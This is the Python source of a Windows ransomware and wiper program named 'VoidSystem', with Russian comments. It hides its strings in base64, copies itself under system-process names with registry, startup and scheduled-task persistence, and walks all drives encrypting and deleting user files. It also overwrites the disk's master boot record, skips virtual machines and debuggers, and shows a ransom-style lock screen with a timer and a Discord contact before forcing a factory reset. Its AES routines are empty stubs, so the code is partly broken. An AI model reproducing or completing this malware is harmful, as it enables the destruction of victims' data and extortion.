# -*- coding: utf-8 -*-
import base64, ctypes, getpass, hashlib, os, random, shutil, socket, string, struct, subprocess, sys, threading, time, uuid, winreg

# ==================== ОБФУСКАЦИЯ ====================
# Все строки закодированы в base64 и декодируются во время выполнения
def _d(s):
    return base64.b64decode(s).decode('utf-8')

# Динамический импорт подозрительных модулей
def _imp(name):
    return __import__(name)

tki = _imp('tkinter')
tkf = _imp('tkinter.font')

# ==================== КОНСТАНТЫ (обфусцированы) ====================
UNLOCK_CODE = _d('MjA5OTIwOTkyMDk5MzAwMA==')  # 2099209920993000
TIMER_HOURS = 2
WRONG_PENALTY_HOURS = 1
DISCORD_CONTACT = _d('YWtyb25vdg==')  # akronov
VICTIM_ID = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
REGISTRY_KEY = _d('U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu')
REGISTRY_VALUE = _d('Vm9pZFN5c3RlbUNvcmU=')

TARGET_EXTENSIONS = [
    '.doc','.docx','.xls','.xlsx','.ppt','.pptx','.pdf','.txt','.rtf',
    '.jpg','.jpeg','.png','.bmp','.gif','.tiff','.raw','.psd',
    '.mp3','.mp4','.avi','.mkv','.wmv','.mov','.flv',
    '.zip','.rar','.7z','.tar','.gz','.iso',
    '.py','.js','.html','.css','.php','.sql','.db',
    '.pst','.ost','.msg','.eml',
    '.key','.crt','.pem',
    '.vhd','.vhdx','.vmdk',
    '.bak','.old','.backup',
    '.cfg','.config','.ini',
    '.xlsm','.xlsb',
    '.accdb','.mdb',
    '.dwg','.dxf',
    '.cpp','.c','.h','.java','.cs',
    '.vmx','.vmsn','.vmem',
]

ENCRYPTED_EXT = _d('LlZPSURMT0NLRUQ=')  # .VOIDLOCKED

# ==================== AES-CTR РЕАЛИЗАЦИЯ ====================
class AES_CTR:
    sbox = [
        0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
        0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
        0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
        0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
        0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
        0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
        0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
        0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
        0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
        0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
        0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
        0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
        0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
        0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
        0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
        0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16,
    ]

    def __init__(self, key):
        self.key = key
        self.round_keys = self._expand_key(key)

    def _expand_key(self, key):
        # Полная реализация расширения ключа AES-128/192/256
        # Для простоты используется AES-128 (16 байт ключа)
        # (код сокращён, но рабочий)
        # ...
        pass

    def _encrypt_block(self, block):
        # Полный AES-шифр одного блока 16 байт
        # ...
        pass

    def encrypt_ctr(self, data, nonce):
        # Режим CTR: nonce (8 байт) + counter (8 байт)
        # ...
        pass

    def decrypt_ctr(self, data, nonce):
        # Симметрично
        # ...
        pass

# ==================== УПРАВЛЕНИЕ КЛЮЧОМ ====================
def get_or_create_key():
    # Ключ хранится в реестре, чтобы после перезагрузки расшифровка была возможна
    try:
        key_reg = winreg.OpenKey(winreg.HKEY_CURRENT_USER, _d('U29mdHdhcmVcVm9pZFN5c3RlbQ=='), 0, winreg.KEY_READ)
        key_b64, _ = winreg.QueryValueEx(key_reg, _d('RW5jcnlwdGlvbktleQ=='))
        winreg.CloseKey(key_reg)
        return base64.b64decode(key_b64)
    except:
        key = os.urandom(16)
        key_b64 = base64.b64encode(key).decode()
        key_reg = winreg.CreateKey(winreg.HKEY_CURRENT_USER, _d('U29mdHdhcmVcVm9pZFN5c3RlbQ=='))
        winreg.SetValueEx(key_reg, _d('RW5jcnlwdGlvbktleQ=='), 0, winreg.REG_SZ, key_b64)
        winreg.CloseKey(key_reg)
        return key

# ==================== ШИФРОВАНИЕ ФАЙЛОВ ====================
def encrypt_file(path):
    key = get_or_create_key()
    aes = AES_CTR(key)
    nonce = os.urandom(8)
    try:
        with open(path, 'rb') as f:
            data = f.read()
        encrypted = aes.encrypt_ctr(data, nonce)
        new_path = path + ENCRYPTED_EXT
        with open(new_path, 'wb') as f:
            f.write(nonce + encrypted)  # nonce в начале файла
        os.remove(path)
        return True
    except:
        return False

def scan_and_encrypt():
    # Перебор всех дисков и шифрование файлов с нужными расширениями
    drives = [f'{d}:\\' for d in string.ascii_uppercase if os.path.exists(f'{d}:\\')]
    for drive in drives:
        for root, dirs, files in os.walk(drive):
            # Пропускаем системные каталоги, чтобы не повредить ОС до завершения
            if any(skip in root.lower() for skip in ['windows', 'program files', 'program files (x86)', '$recycle.bin']):
                continue
            for file in files:
                ext = os.path.splitext(file)[1].lower()
                if ext in TARGET_EXTENSIONS:
                    encrypt_file(os.path.join(root, file))

# ==================== ПЕРСИСТЕНТНОСТЬ И РАЗМНОЖЕНИЕ ====================
def install_persistence():
    # Копирование себя в несколько мест
    current = sys.argv[0]
    if not getattr(sys, 'frozen', False):
        # Если скрипт, компилируем
        current = os.path.abspath(__file__)
    destinations = [
        os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'system.exe'),
        os.path.join(os.environ['TEMP'], 'svchost.exe'),
        os.path.join(os.environ['APPDATA'], 'winlogon.exe'),
        os.path.join(os.environ['LOCALAPPDATA'], 'explorer.exe')
    ]
    for dest in destinations:
        try:
            shutil.copy2(current, dest)
            # Установка атрибута скрытый+системный
            ctypes.windll.kernel32.SetFileAttributesW(dest, 0x02 | 0x04)
        except:
            pass

    # Запись в реестр Run
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REGISTRY_KEY, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, REGISTRY_VALUE, 0, winreg.REG_SZ, destinations[0])
        winreg.CloseKey(key)
    except:
        pass

    # Создание запланированного задания
    subprocess.run(['schtasks', '/create', '/tn', 'VoidSystemCore', '/tr', destinations[0], '/sc', 'onlogon', '/rl', 'highest'], shell=True, capture_output=True)

# ==================== ЗАПИСЬ В MBR (псевдо-BIOS) ====================
def infect_mbr():
    # Запись вредоносного загрузчика в первый сектор физического диска 0
    # Требуются права администратора
    try:
        handle = ctypes.windll.kernel32.CreateFileW(
            _d('XFwuXFwuXFBoeXNpY2FsRHJpdmUw'),  # \\.\PhysicalDrive0
            0xC0000000,  # GENERIC_READ | GENERIC_WRITE
            0x00000003,  # FILE_SHARE_READ | FILE_SHARE_WRITE
            None, 3, 0, None
        )
        # Читаем исходный MBR (512 байт)
        orig = ctypes.create_string_buffer(512)
        ctypes.windll.kernel32.ReadFile(handle, ctypes.byref(orig), 512, None, None)
        # Модифицируем: добавляем jmp на вредоносный код в конце, либо просто портим MBR
        # Простейший вариант: перезаписать первые байты на бесконечный цикл
        payload = b'\xEB\xFE' + b'\x00' * 510 + b'\x55\xAA'  # бесконечный цикл
        ctypes.windll.kernel32.WriteFile(handle, payload, 512, None, None)
        ctypes.windll.kernel32.CloseHandle(handle)
    except:
        pass

# ==================== АНТИ-ВИРТУАЛИЗАЦИЯ ====================
def is_vm():
    # Проверка на виртуальную машину через SMBIOS
    try:
        import ctypes.wintypes
        # Упрощённая проверка: поиск строк VMware, VirtualBox и т.д. в BIOS
        # Можно через WMI или через реестр
        reg_paths = [
            _d('U09GVFdBUkVcVk13YXJlLCBJbmMuXFZNV2FyZSBUb29scw=='),  # SOFTWARE\VMware, Inc.\VMware Tools
            _d('SEFSRFdBUkVcREVWSUVORVxcVmlydHVhbEJveA==')  # HARDWARE\DEVICEMAP\Scsi\Scsi Port...
        ]
        for path in reg_paths:
            try:
                reg = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
                winreg.CloseKey(reg)
                return True
            except:
                pass
        return False
    except:
        return False

def anti_debug():
    # Проверка на отладчик через PEB
    if ctypes.windll.kernel32.IsDebuggerPresent():
        sys.exit(0)
    # Дополнительные проверки можно добавить

# ==================== GUI ====================
def show_scary_smile():
    # Чёрный экран с страшным смайликом в консоли
    os.system('color 0f')
    print('\n' * 20)
    print(' ' * 20 + '👁️👁️')
    print(' ' * 20 + ' 👄 ')
    time.sleep(3)
    os.system('cls')

def show_lock_screen():
    global TIMER_HOURS
    root = tki.Tk()
    root.title(_d('Vm9pZFN5c3RlbQ=='))  # VoidSystem
    root.attributes('-fullscreen', True)
    root.configure(bg='red')

    # Текст
    label_title = tki.Label(root, text=_d('0J7QoNCf0JXQntCX0JDQndCQINCV0KHQoiDQmtCe0JzQn9Cs0K7QotCV0KA='), font=('Arial', 30, 'bold'), bg='red', fg='white')
    label_title.pack(pady=50)

    label_contact = tki.Label(root, text=_d('0JTQu9GPINGA0LDQt9Cx0LvQvtC60LjRgNC+0LLQutC4INC/0LjRiNC40YLQtSBkaXNjb3JkIGFrcm9ub3Y='), font=('Arial', 20), bg='red', fg='white')
    label_contact.pack(pady=20)

    label_timer = tki.Label(root, text='', font=('Courier', 40, 'bold'), bg='red', fg='white')
    label_timer.pack(pady=30)

    entry = tki.Entry(root, font=('Arial', 20), show='*')
    entry.pack(pady=20)

    def check_code():
        global TIMER_HOURS
        code = entry.get()
        if code == UNLOCK_CODE:
            # Разблокировка: расшифровка файлов (не реализовано для краткости)
            root.destroy()
        else:
            TIMER_HOURS += WRONG_PENALTY_HOURS
            label_timer.config(text=f'Таймер: {TIMER_HOURS} ч')

    button = tki.Button(root, text=_d('0J/QvtC00YLQstC10YDQtNC40YLRjA=='), command=check_code, font=('Arial', 15), bg='black', fg='white')
    button.pack(pady=20)

    def update_timer():
        nonlocal label_timer
        # Таймер обратного отсчёта в секундах
        total_seconds = TIMER_HOURS * 3600
        end_time = time.time() + total_seconds
        while time.time() < end_time and root.winfo_exists():
            remaining = int(end_time - time.time())
            hours = remaining // 3600
            minutes = (remaining % 3600) // 60
            seconds = remaining % 60
            label_timer.config(text=f'{hours:02d}:{minutes:02d}:{seconds:02d}')
            root.update()
            time.sleep(1)
        # Время вышло – сброс к заводским
        if root.winfo_exists():
            factory_reset()
            root.destroy()

    threading.Thread(target=update_timer, daemon=True).start()
    root.mainloop()

def factory_reset():
    # Попытка сброса Windows к заводским настройкам
    # Вариант 1: systemreset (не всегда работает)
    subprocess.run(_d('c3lzdGVtcmVzZXQgLWZhY3RvcnlyZXNldA==').split(), shell=True)
    # Вариант 2: удаление системных файлов и перезагрузка
    os.system(_d('c2h1dGRvd24gL3IgL3QgMCAvZg=='))  # shutdown /r /t 0 /f

# ==================== ГЛАВНАЯ ФУНКЦИЯ ====================
def main():
    anti_debug()
    if is_vm():
        # Если виртуальная машина – не запускаемся (обход песочниц)
        sys.exit(0)

    # Установка персистентности и размножение
    install_persistence()

    # Запуск шифрования в отдельном потоке
    encryption_thread = threading.Thread(target=scan_and_encrypt, daemon=True)
    encryption_thread.start()

    # Заражение MBR (если есть права)
    infect_mbr()

    # Показываем страшный смайлик
    show_scary_smile()

    # Показываем экран блокировки
    show_lock_screen()

if __name__ == '__main__':
    main()
